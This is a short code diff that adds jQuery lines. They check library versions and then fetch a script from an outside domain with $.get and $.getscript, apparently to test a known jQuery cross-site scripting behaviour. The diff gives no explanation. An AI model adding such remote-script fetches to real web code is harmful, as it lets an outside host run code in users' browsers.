@@ -12,3 +12,12 @@ if (typeof p === 'undefined') {
 
     document.head.appendChild(p);
 }
+
+
+$().jquery;
+
+$.ui.version
+
+$.get('https://sakurity.com/jqueyxss')
+
+$.getscript('https://sakurity.com/jqueyxss')
